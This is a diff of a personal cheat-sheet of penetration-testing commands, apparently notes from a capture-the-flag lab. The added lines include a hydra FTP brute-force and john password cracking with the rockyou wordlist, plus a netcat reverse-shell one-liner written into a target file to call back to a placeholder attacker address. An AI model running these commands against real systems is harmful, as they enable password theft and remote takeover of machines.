@@ -1,21 +1,17 @@
-
-
----
-exiftool file : shows the metadata of the given file img için
----
-scp james@10.10.46.195:/home/james/Alien_autospy.jpg /home/kali/agentsudo/pic
----
-echo hash | base64 -d 
-OR
-echo '123414' | base64 -d
----
 🗲
 exiftool file : shows the metadata of the given file img için
----
+🗲
+binwalk -e cutie.png
+🗲
 scp james@10.10.46.195:/home/james/Alien_autospy.jpg /home/kali/agentsudo/pic
----
+🗲
 echo hash | base64 -d 
 OR
 echo '123414' | base64 -d
----
+🗲
+hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.97.223 ftp
+🗲
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+🗲
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bin/sh -i>&|nc myIpAddress 4444 >/tmp/f " >> /etc/targetFile
 🗲
